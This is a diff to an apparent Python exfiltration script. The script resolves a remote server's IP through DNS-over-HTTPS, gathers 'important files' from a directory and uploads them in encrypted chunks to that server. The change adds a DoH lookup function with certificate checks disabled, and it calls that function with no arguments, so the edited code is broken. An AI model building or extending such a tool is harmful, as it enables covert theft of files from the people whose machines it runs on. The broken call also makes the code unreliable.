@@ -55,16 +55,42 @@ def doh_query(domain, doh_url):
         response.raise_for_status()
         data = response.content
         print("\n[-] Response Data : ",data)
+        return decode_dns_response(data)
+
+def domain_details(domain, doh_url):
+    query = create_dns_query(domain)
+    headers = {
+        'Content-Type': 'application/dns-message',
+        'Accept': 'application/dns-message'
+    }
+    dns_query_b64 = base64.urlsafe_b64encode(query).decode('utf-8').rstrip('=')
+    full_url = f"{doh_url}?dns={dns_query_b64}"
+
+    print(f"{Fore.YELLOW}[ * ] Performing DoH Query on {domain} using {doh_url}")
+
+    with httpx.Client(http2=True, verify=False) as client:
+        response = client.get(full_url, headers=headers)
+        response.raise_for_status()
+        data = response.content
+
+    print("\n[-] Response Data:", data)
+
+    try:
+        response = DNSRecord.parse(data)
+        print(f"{Fore.GREEN}[ + ] Successfully parsed DNS response.\n")
+        
         for answer in response.rr:
-            print(f"[*] Answer section:")
+            print(f"{Fore.CYAN}[*] Answer section:")
             print(f"\t  [+] Name: {answer.rname}")
             print(f"\t  [+] Type: {answer.rtype}")
             print(f"\t  [+] TTL: {answer.ttl}")
-            print(f"\t  [+] LENGTH: {len(answer.rdata.data)}")
+            print(f"\t  [+] LENGTH: {len(answer.rdata.data) if hasattr(answer.rdata, 'data') else 'N/A'}")
             print(f"\t  [+] IP Address: {answer.rdata}\n")
-        return decode_dns_response(data)
+        
+    except Exception as e:
+        print(f"{Fore.RED}[ ! ] Error parsing DNS response: {e}")
 
-
+        
 def get_important_files(directory, number_of_files):
     print(f"{Fore.CYAN}[ * ] Fetching important files from {directory}")
 
@@ -138,8 +164,10 @@ if __name__ == "__main__":
             print(f"{Fore.RED}[ ! ] Failed to resolve server IP using DoH providers.")
 
     if server_ip and server_ip != "0":
+        domain_details()
         print(f"{Fore.GREEN}[ + ] Using resolved server IP: {server_ip}")
         for file in important_files:
             send_file_in_chunks(file, server_ip, cipher_suite)
+        
     else:
         print(f"{Fore.RED}[ ! ] No valid server IP found. Aborting file upload.")
